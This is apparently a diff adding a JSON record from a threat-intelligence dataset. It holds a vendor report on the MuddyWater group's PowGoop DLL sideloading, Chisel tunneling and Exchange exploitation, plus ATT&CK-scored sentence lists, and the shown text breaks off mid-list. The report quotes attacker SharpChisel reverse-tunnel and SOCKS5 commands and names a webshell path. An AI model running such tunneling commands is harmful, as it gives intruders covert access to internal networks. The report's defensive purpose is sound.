@@ -1,0 +1,1187 @@
+{
+  "original_txt": "Overview\nMuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available. As of January 12th, 2022, U.S. CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS). While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.\nAs in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.\nU.S. Cyber Command pointed to multiple malware sets used by MuddyWater. Among those, PowGoop correlates with activities we’ve triaged in recent incidents. We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.\nIranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity. If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3. Attributed through @NCIJTF @FBI\n— USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022\nAnalysis of New PowGoop Variants\nPowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking (T1574.001). The name derives from the usage ‘GoogleUpdate.exe\n‘ to load a malicious modified version of ‘goopdate.dll\n‘, which is used to load a malicious PowerShell script from an external file. Other variants were described by ClearSkySec and Symantec.\nWe identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures. The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs. Aside from ‘GoogleUpdate.exe\n’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe\n’, ‘FileSyncConfig.exe\n’ and ‘Inno_Updater.exe\n’.\nEach contains a modified DLL and a renamed authentic DLL. The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers. The list of hijacked DLLs is presented below:\n| Software Name | Hijacked DLL | Renamed DLL |\n| GoogleUpdate.exe | goopdate.dll | goopdate86.dll |\n| inno_updater.exe | vcruntime140.dll | vcruntime141.dll |\n| FileSyncConfig.exe | vcruntime140.dll | vcruntime141.dll |\n| git.exe | libpcre2-8-0.dll | libpcre2-8-1.dll |\nUnlike previous versions, the hijacked DLLs attempt to reflectively load two additional files, one named ‘Core.dat\n’, which is a shellcode called from the export ‘DllReg\n’ and the other named ‘Dore.dat\n’, which is a PE file with a `MZRE\n` header, allowing it to execute as a shellcode as well, similarly to the publicly reported techniques, called from the export ‘DllRege\n’.\nThose two ‘.dat\n’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.\nBoth ‘Dore.dat\n’ and ‘Core.dat\n’ search for a file named ‘config.txt’ and run it using PowerShell in a fashion similar to older versions (T1059.001\n). The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat\n’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.\nIt is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one. Given that, it is possible that one or the other could be used as a backup component. The PowerShell payloads within ‘config.txt\n’ could not be retrieved at the time of writing.\nMuddyWater Tunneling Activity\nThe operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts(T1572). The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities. Among the tunneling tools MuddyWater attackers were observed using are Chisel, SSF and Ligolo.\nThe nature of tunneling activities is often confusing. However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools. This is an example of a command executed by the attackers on some of the victims:\nSharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999\nThe “r\n” flag used in the client execution implies the server is running in “reverse” mode. Setting the --reverse\nflag, according to Chisel documentation, “allows clients to specify reverse port forwarding remotes in addition to normal remotes”.\nIn this case, the “SharpChisel.exe\n” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.\nThis might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service. This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999:\nSharpChisel.exe server -p 9999 --socks5\nBy setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5. This actually creates a tunnel within a tunnel. Given that, it is most likely the operator initiated SOCKS traffic to the server over port 8888, tunneling traffic from applications of interest to inner parts of the network.\nThe usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.\nExchange Exploitation\nWhen tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations. This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.\nThe attackers attempt to exploit Exchange servers using two different tools:\n- A publicly available script for exploiting CVE-2020-0688 (T1190)\n- Ruler – an open source Exchange exploitation framework\nCVE-2020-0688 Exploitation\nAnalysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East. The exploit enables remote code execution for an authenticated user. The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.\nThe attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx\n“. The webshell awaits the parameter “cmd\n” and runs the commands in it utilizing XSL Script Processing (T1220).\nThis activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py. The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx\n” (T1505.003). It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.\nRuler Exploitation\nAmong other activities performed by the threat actors was attempted Ruler exploitation. The instance identified targeted a telecommunication company in the Middle East. The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler (T1137.003).\nUsage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.\nSummary\nAnalysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques. While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection. This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.\nLike many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups. Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.\nIndicators of Compromise\n- Goopdate.dll\n- A5981C4FA0A3D232CE7F7CE1225D9C7E\n- 8FED2FF6B739C13BADB14C1A884D738C80CB6F34\n- AA48F06EA8BFEBDC0CACE9EA5A2F9CE00C094CE10DF52462C4B9E87FEFE70F94\n- Libpcre2-8-0.dll\n- F8E7FF6895A18CC3D05D024AC7D8BE3E\n- 97248B6E445D38D48334A30A916E7D9DDA33A9B2\n- F1178846036F903C28B4AB752AFE1B38B531196677400C2250AC23377CF44EC3\n- Vcruntime140.dll\n- CEC48BCDEDEBC962CE45B63E201C0624\n- 81F46998C92427032378E5DEAD48BDFC9128B225\n- DD7EE54B12A55BCC67DA4CEAED6E636B7BD30D4DB6F6C594E9510E1E605ADE92\n- Core.dat\n- A65696D6B65F7159C9FFCD4119F60195\n- 570F7272412FF8257ED6868D90727A459E3B179E\n- B5B1E26312E0574464DDEF92C51D5F597E07DBA90617C0528EC9F494AF7E8504\n- Dore.dat\n- 6C084C8F5A61C6BEC5EB5573A2D51FFB\n- 61608ED1DE56D0E4FE6AF07ECBA0BD0A69D825B8\n- 7E7545D14DF7B618B3B1BC24321780C164A0A14D3600DBAC0F91AFBCE1A2F9F4\nMITRE ATT&CK\n- T1190 – Exploit Public-Facing Application\n- T1572 – Protocol Tunneling\n- T1574.001 – Hijack Execution Flow: DLL Search Order Hijacking\n- T1059.001 – Command and Scripting Interpreter: PowerShell\n- T1505.003 – Server Software Component: Web Shell\n- T1220 – XSL Script Processing",
+  "sanitized_txt": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available. As of January 12th, 2022, U.S. CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS). While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.\nAs in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.\nU.S. Cyber Command pointed to multiple malware sets used by MuddyWater. Among those, PowGoop correlates with activities we’ve triaged in recent incidents. We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.\nWe identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures. The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs. Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.\nEach contains a modified DLL and a renamed authentic DLL. The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers. The list of hijacked DLLs is presented below:\n| Software Name | Hijacked DLL | Renamed DLL | | GoogleUpdate.exe | goopdate.dll | goopdate86.dll | | inno_updater.exe | vcruntime140.dll | vcruntime141.dll | | FileSyncConfig.exe | vcruntime140.dll | vcruntime141.dll | | git.exe | libpcre2-8-0.dll | libpcre2-8-1.dll | Unlike previous versions, the hijacked DLLs attempt to reflectively load two additional files, one named ‘Core.dat ’, which is a shellcode called from the export ‘DllReg ’ and the other named ‘Dore.dat ’, which is a PE file with a `MZRE ` header, allowing it to execute as a shellcode as well, similarly to the publicly reported techniques, called from the export ‘DllRege ’.\nThose two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.\nIt is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one. Given that, it is possible that one or the other could be used as a backup component. The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.\nThe nature of tunneling activities is often confusing. However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools. This is an example of a command executed by the attackers on some of the victims:\nSharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999 The “r ” flag used in the client execution implies the server is running in “reverse” mode. Setting the --reverse flag, according to Chisel documentation, “allows clients to specify reverse port forwarding remotes in addition to normal remotes”.\nIn this case, the “SharpChisel.exe ” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.\nThis might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service. This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999:\nSharpChisel.exe server -p 9999 --socks5 By setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5. This actually creates a tunnel within a tunnel. Given that, it is most likely the operator initiated SOCKS traffic to the server over port 8888, tunneling traffic from applications of interest to inner parts of the network.\nThe usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.\nExchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations. This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.\nThe attackers attempt to exploit Exchange servers using two different tools:\nUsage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.\nSummary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques. While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection. This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.\nLike many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups. Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+  "ID_list": [
+    "T1059.001",
+    "T1137.003",
+    "T1190",
+    "T1220",
+    "T1505.003",
+    "T1572",
+    "T1574.001"
+  ],
+  "Name_list": [
+    "Execution",
+    "Rundll32",
+    "Source",
+    "Web Shell"
+  ],
+  "TTP_sentences": {
+    "T1190": [
+      {
+        "sentence": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available.",
+        "score": 0.3611
+      },
+      {
+        "sentence": "CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS).",
+        "score": 0.3224
+      },
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.4083
+      },
+      {
+        "sentence": "As in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.",
+        "score": 0.4321
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.4629
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.3515
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.3159
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.4311
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.4055
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.3254
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.3267
+      },
+      {
+        "sentence": "Given that, it is possible that one or the other could be used as a backup component.",
+        "score": 0.3086
+      },
+      {
+        "sentence": "In this case, the “SharpChisel.exe ” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.",
+        "score": 0.3871
+      },
+      {
+        "sentence": "This might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service.",
+        "score": 0.4384
+      },
+      {
+        "sentence": "This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999: SharpChisel.exe server -p 9999 --socks5 By setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5.",
+        "score": 0.4341
+      },
+      {
+        "sentence": "Given that, it is most likely the operator initiated SOCKS traffic to the server over port 8888, tunneling traffic from applications of interest to inner parts of the network.",
+        "score": 0.4314
+      },
+      {
+        "sentence": "The usage of Chisel and other tunneling tools effectively enable the threat actor to connect to machines within target environments as if they were inside the operator LAN.",
+        "score": 0.3504
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.6226
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.5968
+      },
+      {
+        "sentence": "The attackers attempt to exploit Exchange servers using two different tools: - A publicly available script for exploiting CVE-2020-0688 () - Ruler – an open source Exchange exploitation framework CVE-2020-0688 Exploitation Analysis of the activity observed suggests the MuddyWater threat group attempted to exploit CVE-2020-0688 on governmental organizations in the Middle East.",
+        "score": 0.8073
+      },
+      {
+        "sentence": "The exploit enables remote code execution for an authenticated user.",
+        "score": 0.5392
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.598
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.3698
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.6422
+      },
+      {
+        "sentence": "The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx ” ().",
+        "score": 0.6944
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.5247
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.6284
+      },
+      {
+        "sentence": "The instance identified targeted a telecommunication company in the Middle East.",
+        "score": 0.3614
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.3413
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.3122
+      },
+      {
+        "sentence": "While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.",
+        "score": 0.347
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.4014
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.3762
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3274
+      }
+    ],
+    "T1220": [
+      {
+        "sentence": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available.",
+        "score": 0.3323
+      },
+      {
+        "sentence": "CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS).",
+        "score": 0.343
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.4179
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3052
+      },
+      {
+        "sentence": "Iranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity.",
+        "score": 0.3541
+      },
+      {
+        "sentence": "If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3.",
+        "score": 0.3417
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.3089
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.6678
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3371
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.4623
+      },
+      {
+        "sentence": "The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs.",
+        "score": 0.4411
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.3666
+      },
+      {
+        "sentence": "Each contains a modified DLL and a renamed authentic DLL.",
+        "score": 0.4559
+      },
+      {
+        "sentence": "The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers.",
+        "score": 0.471
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.4785
+      },
+      {
+        "sentence": "Both ‘Dore.dat ’ and ‘Core.dat ’ search for a file named ‘config.txt’ and run it using PowerShell in a fashion similar to older versions ( ).",
+        "score": 0.4001
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.5737
+      },
+      {
+        "sentence": "It is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one.",
+        "score": 0.4029
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.6492
+      },
+      {
+        "sentence": "MuddyWater Tunneling Activity The operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts().",
+        "score": 0.3386
+      },
+      {
+        "sentence": "The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities.",
+        "score": 0.3758
+      },
+      {
+        "sentence": "The nature of tunneling activities is often confusing.",
+        "score": 0.3268
+      },
+      {
+        "sentence": "However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools.",
+        "score": 0.4664
+      },
+      {
+        "sentence": "This is an example of a command executed by the attackers on some of the victims: SharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999 The “r ” flag used in the client execution implies the server is running in “reverse” mode.",
+        "score": 0.3187
+      },
+      {
+        "sentence": "This actually creates a tunnel within a tunnel.",
+        "score": 0.4061
+      },
+      {
+        "sentence": "Exchange Exploitation When tracking MuddyWater activity, we came across an interesting subset of activity targeting Exchange servers of high-profile organizations.",
+        "score": 0.3499
+      },
+      {
+        "sentence": "This subset of Exchange exploitation activity is rather interesting, as without context it would be difficult to attribute it to MuddyWater because the activity relies almost completely on publicly available offensive security tools.",
+        "score": 0.325
+      },
+      {
+        "sentence": "The specific exploit MuddyWater operators were attempting to run was utilized to drop a webshell.",
+        "score": 0.3929
+      },
+      {
+        "sentence": "The attempted webshell drop was performed using a set of PowerShell commands that write the webshell content into a specific path “/ecp/HybridLogout.aspx “.",
+        "score": 0.5177
+      },
+      {
+        "sentence": "The webshell awaits the parameter “cmd ” and runs the commands in it utilizing XSL Script Processing ().",
+        "score": 0.5023
+      },
+      {
+        "sentence": "This activity is highly correlated with a CVE-2020-0688 exploitation script from a Github repository named fuckchina_v2.py.",
+        "score": 0.3415
+      },
+      {
+        "sentence": "The script utilizes CVE-2020-0688 to upload an ASPX webshell to the path : “/ecp/HybridLogout.aspx ” ().",
+        "score": 0.3346
+      },
+      {
+        "sentence": "It is also one of the only publicly available CVE-2020-0688 implementations that drop a web shell.",
+        "score": 0.4249
+      },
+      {
+        "sentence": "Ruler Exploitation Among other activities performed by the threat actors was attempted Ruler exploitation.",
+        "score": 0.3185
+      },
+      {
+        "sentence": "The instance identified targeted a telecommunication company in the Middle East.",
+        "score": 0.3206
+      },
+      {
+        "sentence": "The observed activity suggests the threat actor attempted to create malicious forms, which is one of the most common usages of Ruler ().",
+        "score": 0.5476
+      },
+      {
+        "sentence": "Usage of Ruler was previously associated with other Iranian threat actors, most commonly with APT33.",
+        "score": 0.4322
+      },
+      {
+        "sentence": "Summary Analysis of MuddyWater activity suggests the group continues to evolve and adapt their techniques.",
+        "score": 0.4694
+      },
+      {
+        "sentence": "While still relying on publicly available offensive security tools, the group has been refining its custom toolset and utilizing new techniques to avoid detection.",
+        "score": 0.3563
+      },
+      {
+        "sentence": "This is observed through the three distinct activities observed and analyzed in this report: The evolution of the PowGoop malware family, the usage of tunneling tools, and the targeting of Exchange servers in high-profile organizations.",
+        "score": 0.3802
+      },
+      {
+        "sentence": "Like many other Iranian threat actors, the group displays less sophistication and technological complexity compared to other state-sponsored APT groups.",
+        "score": 0.4146
+      },
+      {
+        "sentence": "Even so, it appears MuddyWater’s persistency is a key to their success, and their lack of sophistication does not appear to prevent them from achieving their goals.",
+        "score": 0.3663
+      }
+    ],
+    "T1505.003": [
+      {
+        "sentence": "Overview MuddyWater is commonly considered an Iranian state-sponsored threat actor but no further granularity has previously been available.",
+        "score": 0.3945
+      },
+      {
+        "sentence": "As of January 12th, 2022, U.S.",
+        "score": 0.3783
+      },
+      {
+        "sentence": "CyberCommand has attributed this activity to the Iranian Ministry of Intelligence (MOIS).",
+        "score": 0.3827
+      },
+      {
+        "sentence": "While some cases allow for attribution hunches, or even fleshed out connections to handles and online personas, attribution to a particular government organization is often reserved to the kind of visibility only available to governments with a well-developed all-source and signals intelligence apparatus.",
+        "score": 0.4285
+      },
+      {
+        "sentence": "As in all cases of public government attribution, we take this as an opportunity to reassess our assumptions about a given threat actor all the while recognizing that we can’t independently verify the basis for this claim.",
+        "score": 0.3776
+      },
+      {
+        "sentence": "Cyber Command pointed to multiple malware sets used by MuddyWater.",
+        "score": 0.3518
+      },
+      {
+        "sentence": "Among those, PowGoop correlates with activities we’ve triaged in recent incidents.",
+        "score": 0.3079
+      },
+      {
+        "sentence": "We hope sharing relevant in-the-wild findings will further bolster our collective defense against this threat.",
+        "score": 0.3878
+      },
+      {
+        "sentence": "Iranian MOIS hacker group #MuddyWater is using a suite of malware to conduct espionage and malicious activity.",
+        "score": 0.3205
+      },
+      {
+        "sentence": "If you see two or more of these malware on your network, you may have MuddyWater on it: https://t.co/xTI6xuQOg3.",
+        "score": 0.3635
+      },
+      {
+        "sentence": "Attributed through @NCIJTF @FBI — USCYBERCOM Cybersecurity Alert (@CNMF_CyberAlert) January 12, 2022 Analysis of New PowGoop Variants PowGoop is a malware family first described by Palo Alto which utilizes DLL search order hijacking ().",
+        "score": 0.3929
+      },
+      {
+        "sentence": "The name derives from the usage ‘GoogleUpdate.exe ‘ to load a malicious modified version of ‘goopdate.dll ‘, which is used to load a malicious PowerShell script from an external file.",
+        "score": 0.495
+      },
+      {
+        "sentence": "Other variants were described by ClearSkySec and Symantec.",
+        "score": 0.3902
+      },
+      {
+        "sentence": "We identified newer variants of PowGoop loader that involve significant changes, suggesting the group continues to use and maintain it even after recent exposures.",
+        "score": 0.4606
+      },
+      {
+        "sentence": "The new variants reveal that the threat group has expanded its arsenal of legitimate software used to load malicious DLLs.",
+        "score": 0.3402
+      },
+      {
+        "sentence": "Aside from ‘GoogleUpdate.exe ’, three additional benign pieces of software are abused in order to sideload malicious DLLs: ‘Git.exe ’, ‘FileSyncConfig.exe ’ and ‘Inno_Updater.exe ’.",
+        "score": 0.3473
+      },
+      {
+        "sentence": "Each contains a modified DLL and a renamed authentic DLL.",
+        "score": 0.3097
+      },
+      {
+        "sentence": "The hijacked DLL contains imports originating from its renamed counterpart, as well as two additional functions written by the attackers.",
+        "score": 0.3929
+      },
+      {
+        "sentence": "Those two ‘.dat ’ files are identical for each of the hijacked DLLs and are both executed using rundll32 on their respective export, which reads the file from disk to a virtually allocated buffer, followed by a call to offset 0 in the read data.",
+        "score": 0.3907
+      },
+      {
+        "sentence": "Both ‘Dore.dat ’ and ‘Core.dat ’ search for a file named ‘config.txt’ and run it using PowerShell in a fashion similar to older versions ( ).",
+        "score": 0.484
+      },
+      {
+        "sentence": "The overlap in functionality between the two components is not clear; however, it is evident that ‘Core.dat ’ represents a more mature and evolved version of PowGoop as it is loaded as a shellcode, making it less likely to be detected statically.",
+        "score": 0.5353
+      },
+      {
+        "sentence": "It is also worth noting that it is not necessary for both components to reside on the infected system as the malware will execute successfully with either one.",
+        "score": 0.3776
+      },
+      {
+        "sentence": "Given that, it is possible that one or the other could be used as a backup component.",
+        "score": 0.3824
+      },
+      {
+        "sentence": "The PowerShell payloads within ‘config.txt ’ could not be retrieved at the time of writing.",
+        "score": 0.4894
+      },
+      {
+        "sentence": "MuddyWater Tunneling Activity The operators behind MuddyWater activities are very fond of tunneling tools, as described in several recent blog posts().",
+        "score": 0.4123
+      },
+      {
+        "sentence": "The custom tools used by the group often provide limited functionality, and are used to drop tunneling tools which enable the operators to conduct a wider set of activities.",
+        "score": 0.4195
+      },
+      {
+        "sentence": "Among the tunneling tools MuddyWater attackers were observed using are Chisel, SSF and Ligolo.",
+        "score": 0.3191
+      },
+      {
+        "sentence": "The nature of tunneling activities is often confusing.",
+        "score": 0.3332
+      },
+      {
+        "sentence": "However, analysis of Chisel executions by MuddyWater operators on some of the victims helps clarify their usage of such tools.",
+        "score": 0.4723
+      },
+      {
+        "sentence": "This is an example of a command executed by the attackers on some of the victims: SharpChisel.exe client xx.xx.xx.xx:8080 r:8888:127.0.0.1:9999 The “r ” flag used in the client execution implies the server is running in “reverse” mode.",
+        "score": 0.5158
+      },
+      {
+        "sentence": "Setting the --reverse flag, according to Chisel documentation, “allows clients to specify reverse port forwarding remotes in addition to normal remotes”.",
+        "score": 0.3284
+      },
+      {
+        "sentence": "In this case, the “SharpChisel.exe ” client runs on the victim machine, connects back to the Chisel server over port 8080, and specifies to forward anything coming over port 8888 of the server to port 9999 of the client.",
+        "score": 0.4379
+      },
+      {
+        "sentence": "This might look odd at first sight as port 9999 is not normally used on Windows machines and is not bound to any specific service.",
+        "score": 0.4672
+      },
+      {
+        "sentence": "This is clarified shortly afterwards as the reverse tunnel is followed by setting up a Chisel SOCKS5 server on the victim, waiting for incoming connections over port 9999: SharpChisel.exe server -p 9999 --socks5 By setting up both a server and a client instance of Chisel on the machine, the operators enable themselves to tunnel a variety of protocols which are supported over SOCKS5.",
+        "score": 0.4961
+      },
+      {
